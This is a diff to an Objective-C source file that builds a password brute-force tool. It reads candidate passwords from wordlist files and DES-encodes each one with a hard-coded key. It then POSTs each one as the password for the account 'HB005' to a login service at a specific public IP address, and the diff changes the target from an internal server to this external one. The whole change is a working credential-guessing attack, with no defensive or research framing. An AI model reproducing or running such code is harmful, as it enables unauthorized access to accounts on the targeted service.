@@ -45,6 +45,10 @@
 @property (nonatomic , strong) CADisplayLink *link;
 
 
+@property (nonatomic , assign) NSInteger sendBegin;
+@property (nonatomic , assign) NSInteger sendEnd;
+@property (nonatomic , assign) NSInteger sendCurrent;
+
 
 
 @end
@@ -126,21 +130,50 @@
 //        [selfWeak chaifen];
 //    });
     
-    //[self sort];
+//    [self sort];
     
-    [self cutRe];
+    //[self cutRe];
     
+    [self sendFileIndex:1 arrayIndex:3000];
 }
+
+- (void)sendFileIndex:(NSInteger)index arrayIndex:(NSInteger)arrayIndex;
+{
+    NSString *inDir = @"/Users/imac-03/Desktop/Ljl/WordList/cut/reResult";
+    _sendBegin = 0;
+    _sendEnd = 193;
+    
+    if (index < _sendBegin || index > _sendEnd) {
+        return;
+    }
+    
+    _sendCurrent = index;
+    _repeatCount = index;
+    
+    NSString *path = [NSString stringWithFormat:@"%@/%ld.txt",inDir,_sendCurrent];
+    
+    NSString *dateStr = [NSString stringWithContentsOfFile:path encoding:NSUTF8StringEncoding error:nil];
+    _sendDatas = [dateStr componentsSeparatedByString:@"\n"];
+    
+    _start = [NSDate date];
+    _allCount = _sendDatas.count;
+    _currentIndex = arrayIndex;
+    
+    [self send];
+}
+
+
 
 - (void)send
 {
     if (_currentIndex < _sendDatas.count) {
         @autoreleasepool{
-            NSString *tmp = _sendDatas[_currentIndex];
-            NSString *pwd = [JoDes encode:tmp key:@"22972820"];
+            NSString *pwd = _sendDatas[_currentIndex];
             [self sendPwd:pwd];
             _currentIndex++;
         }
+    } else {
+        [self sendFileIndex:_sendCurrent+1 arrayIndex:0];
     }
 }
 
@@ -150,13 +183,18 @@
 
 - (void)sendPwd:(NSString *)pwd
 {
+    if (_currentIndex % 1000 == 0) {
+        NSLog(@"%@",pwd);
+    }
+    
+    NSString *pwd1 = [JoDes encode:pwd key:@"21131285"];
     @autoreleasepool{
     NSDictionary *para = @{
-                           @"UserAccount":@"DianMu",
-                           @"Password":pwd
+                           @"UserAccount":@"HB005",
+                           @"Password":pwd1
                            };
     
-    NSString *url = @"http://192.168.100.201:92/UserService.svc/ILogin";
+    NSString *url = @"http://113.140.67.190:8002/UserService.svc/ILogin";
     WeakObj(self);
     [DMTools postWithUrl:url para:para success:^(id responseObject) {
         if ([responseObject[@"UserAccount"] isEqualToString:@"error"] ) {
@@ -630,7 +668,7 @@
 {
     WeakObj(self);
     BACK(^{
-        [selfWeak sortFrom:0 endIndex:16 inDir:@"/Users/daimu/Desktop/pwd/cutResult" outDir:@"/Users/daimu/Desktop/pwd/sortResult"];
+        [selfWeak sortFrom:0 endIndex:193 inDir:@"/Users/imac-03/Desktop/Ljl/WordList/cut/cutResult" outDir:@"/Users/imac-03/Desktop/Ljl/WordList/cut/sortResult"];
     });
 }
 
@@ -638,7 +676,7 @@
 {
     WeakObj(self);
     BACK(^{
-        [selfWeak cutReFrom:0 endIndex:193 inDir:@"/Users/daimu/Desktop/pwd/sortResult" outDir:@"/Users/daimu/Desktop/pwd/reResult"];
+        [selfWeak cutReFrom:0 endIndex:193 inDir:@"/Users/imac-03/Desktop/Ljl/WordList/cut/sortResult" outDir:@"/Users/imac-03/Desktop/Ljl/WordList/cut/reResult"];
     });
 }
 
